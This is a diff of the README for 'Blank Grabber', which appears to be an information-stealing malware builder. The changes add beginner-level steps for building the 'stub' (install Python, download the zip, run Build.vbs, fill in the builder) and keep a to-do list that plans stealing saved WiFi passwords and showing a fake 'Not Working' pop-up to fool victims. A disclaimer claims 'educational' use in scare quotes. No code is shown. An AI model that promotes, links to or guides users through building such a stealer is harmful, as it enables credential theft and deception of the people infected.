@@ -17,7 +17,6 @@
 </p>
 
 ## Download
-
 [![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
 
 **Note:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by this product in any way!
@@ -57,10 +56,26 @@
 
 **Supports:** *Windows 10 and up.*
 
-## To-do
-+ Grab saved WIFI passwords.
-+ Add an icon selector in the builder.
-+ Fake "Not Working" pop up.
+## Requirements
+**To build the stub, you need:**
+- Windows 10/11.
+- Python 3.
+- An active internet connection.
+
+## How to Build?
+*If you literally have no idea how to build it.*
+
+1. Download and install [Python 3](https://www.python.org/downloads/#event). (Make sure to enable the "Add to PATH" option)
+2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
+3. [Download Blank Grabber](#download).
+4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
+5. Navigate to the **Blank Grabber** folder and double click *Build.vbs* file.
+6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
+
+## To-Do/Enhancements
+- [ ] Grab saved WIFI passwords.
+- [ ] Add an icon selector for builder.
+- [ ] Fake "Not Working" pop up.
 
 ## Frequently Asked Questions
 - [What is the approximate stub size after compiling?](#what-is-the-approximate-stub-size-after-compiling)
